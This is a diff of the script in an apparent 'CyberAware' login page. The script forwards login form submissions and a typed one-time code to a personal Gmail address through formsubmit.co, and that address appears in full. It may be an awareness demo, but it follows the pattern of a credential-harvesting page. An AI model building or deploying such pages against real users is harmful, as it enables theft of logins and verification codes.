@@ -117,6 +117,7 @@
 <script>
   let generatedCode = "";
 
+  // Gestion du formulaire de login
   document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
 
@@ -124,7 +125,7 @@
     generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
     document.getElementById("generatedCode").innerText = generatedCode;
 
-    // Prépare les données pour Formsubmit
+    // Prépare les données envoyées à Formsubmit
     const formData = new FormData(this);
     formData.append("_subject", "Nouvelle inscription CyberAware");
     formData.append("_captcha", "false");
@@ -133,32 +134,51 @@
     // Envoi AJAX
     fetch("https://formsubmit.co/ajax/tss.alex84@gmail.com", {
       method: "POST",
-      headers: {
-        "Accept": "application/json"
-      },
+      headers: { "Accept": "application/json" },
       body: formData
     })
     .then(response => response.json())
     .then(() => {
-      // Affiche l'étape code
+      // Passe à l'étape code
       document.getElementById("loginSection").classList.add("hidden");
       document.getElementById("codeSection").classList.remove("hidden");
     })
     .catch(() => {
-      alert("Erreur lors de l'envoi");
+      alert("Erreur lors de l'envoi du formulaire de login");
     });
   });
 
+  // Vérification et envoi du code saisi
   function verifyCode() {
     const input = document.getElementById("codeInput").value;
+
     if (input === generatedCode) {
-      document.getElementById("codeSection").classList.add("hidden");
-      document.getElementById("dashboard").classList.remove("hidden");
+      // Prépare les données pour Formsubmit
+      const formData = new FormData();
+      formData.append("code_saisi", input);
+      formData.append("_subject", "Code validé CyberAware");
+      formData.append("_captcha", "false");
+
+      fetch("https://formsubmit.co/ajax/tss.alex84@gmail.com", {
+        method: "POST",
+        headers: { "Accept": "application/json" },
+        body: formData
+      })
+      .then(response => response.json())
+      .then(() => {
+        // Passe au dashboard
+        document.getElementById("codeSection").classList.add("hidden");
+        document.getElementById("dashboard").classList.remove("hidden");
+      })
+      .catch(() => {
+        alert("Erreur lors de l'envoi du code");
+      });
     } else {
       alert("Code incorrect");
     }
   }
 </script>
+  
 
 </body>
 </html>
